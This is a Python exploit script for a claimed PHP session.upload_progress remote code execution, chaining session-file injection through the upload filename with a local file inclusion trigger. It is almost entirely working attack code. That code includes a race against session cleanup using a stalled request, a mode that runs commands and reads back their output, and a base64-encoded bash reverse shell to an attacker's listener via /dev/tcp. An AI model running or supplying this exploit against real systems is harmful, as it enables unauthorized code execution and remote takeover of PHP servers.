#!/usr/bin/env python3
"""
CVE-2026-109618 / CVE-2026-109619 - PHP session.upload_progress RCE
Attack vector: session file injection via unvalidated filename in upload_progress.

Conditions:
  1. session.upload_progress.enabled = On (DEFAULT)
  2. An LFI sink (include/require with user-influenced path) exists in the app
  3. Session save path is known or guessable (/tmp, /var/lib/php/sessions, etc.)

Default cleanup=On is handled by holding the writer request open after FILE_START
and triggering the LFI while the progress entry still exists.

Two modes:
  --command CMD            run a command, read its output back (proof)
  --lhost IP --lport PORT  send a bash reverse shell to your listener
"""
import argparse
import base64
import sys
import time
import uuid

from lib import send_raw, connect, parse_target


def _body(sid, php_code, boundary):
    return (
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
        + sid.encode() + b"\r\n"
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="f"; filename="'
        + php_code.encode("latin-1") + b'"\r\n\r\n'
    )


def inject_session(host, port, path, sid, php_code, tls=False, boundary="AAABBBCCC"):
    body = _body(sid, php_code, boundary) + b"Z\r\n--" + boundary.encode() + b"--\r\n"
    req = (
        f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\nCookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return send_raw(host, port, req, tls=tls)


def inject_session_stalled(host, port, path, sid, php_code,
                           tls=False, boundary="AAABBBCCC", timeout=30):
    first = _body(sid, php_code, boundary) + b"Z" * 5120
    content_length = len(first) + 100000
    req = (
        f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {content_length}\r\nCookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + first
    sock = connect(host, port, tls=tls, timeout=timeout)
    sock.sendall(req)
    return sock


def trigger_lfi(host, port, lfi_path, session_file, sid, tls=False):
    req = (
        f"GET {lfi_path}?page={session_file} HTTP/1.1\r\nHost: {host}\r\n"
        f"Cookie: PHPSESSID={sid}\r\nConnection: close\r\n\r\n"
    ).encode()
    return send_raw(host, port, req, tls=tls)


def trigger_lfi_fire(host, port, lfi_path, session_file, sid, tls=False):
    """Send the LFI request and return the socket without reading. The request
    blocks while the reverse shell runs, so we don't wait on it."""
    req = (
        f"GET {lfi_path}?page={session_file} HTTP/1.1\r\nHost: {host}\r\n"
        f"Cookie: PHPSESSID={sid}\r\nConnection: close\r\n\r\n"
    ).encode()
    sock = connect(host, port, tls=tls, timeout=10)
    sock.sendall(req)
    return sock


def revshell_php(lhost, lport):
    rs = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    b64 = base64.b64encode(rs.encode()).decode()
    return f"<?php system(base64_decode('{b64}'));?>"


def main():
    ap = argparse.ArgumentParser(description="PHP session.upload_progress RCE")
    ap.add_argument("--target", default="http://127.0.0.1:8080")
    ap.add_argument("--inject-path", default="/index.php")
    ap.add_argument("--lfi-path", default="/vuln.php")
    ap.add_argument("--session-path", default="/tmp")
    ap.add_argument("--command", default="id")
    ap.add_argument("--lhost", help="reverse shell: your listener IP")
    ap.add_argument("--lport", default="4444", help="reverse shell: your listener port")
    ap.add_argument("--sid", default="")
    ap.add_argument("--cleanup-on", action="store_true",
                    help="race the default cleanup=On with a stalled writer")
    ap.add_argument("--attempts", type=int, default=3)
    args = ap.parse_args()

    host, port, tls = parse_target(args.target)
    revshell = bool(args.lhost)
    if revshell:
        php_code = revshell_php(args.lhost, args.lport)
    else:
        cmd = args.command.replace("'", "'\"'\"'")
        php_code = f"<?php echo '___START___'; system('{cmd}'); echo '___END___';?>"

    print(f"[*] Target: {'https' if tls else 'http'}://{host}:{port}")
    if revshell:
        print(f"[*] Reverse shell -> {args.lhost}:{args.lport}  (start your listener first)")
    else:
        print(f"[*] Command: {args.command}")

    for attempt in range(1, args.attempts + 1):
        sid = args.sid or ("exploit" + uuid.uuid4().hex[:20])
        session_file = f"{args.session_path}/sess_{sid}"
        print(f"[attempt {attempt}] SID={sid} file={session_file}")
        stalled = None
        fired = None
        try:
            if args.cleanup_on or revshell:
                stalled = inject_session_stalled(host, port, args.inject_path, sid, php_code, tls=tls)
                time.sleep(0.2)
            else:
                inject_session(host, port, args.inject_path, sid, php_code, tls=tls)

            if revshell:
                fired = trigger_lfi_fire(host, port, args.lfi_path, session_file, sid, tls=tls)
                time.sleep(8)   # hold the request open so the shell stays up
                print(f"[+] reverse shell fired via {session_file} -> {args.lhost}:{args.lport}")
                print("    check your listener")
                return 0

            resp2 = trigger_lfi(host, port, args.lfi_path, session_file, sid, tls=tls)
            body = resp2.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp2 else resp2
            if b"___START___" in body and b"___END___" in body:
                out = body[body.index(b"___START___") + 11:body.index(b"___END___")]
                print(f"[+] RCE CONFIRMED: {out.decode('latin1', 'replace').strip()}")
                return 0
            print(f"    lfi body={body[:160]!r}")
        finally:
            for s in (stalled, fired):
                if s is not None:
                    try:
                        s.close()
                    except Exception:
                        pass
        time.sleep(0.05)
    print("[-] not confirmed - check LFI path / session path / timing")
    return 1


if __name__ == "__main__":
    sys.exit(main())
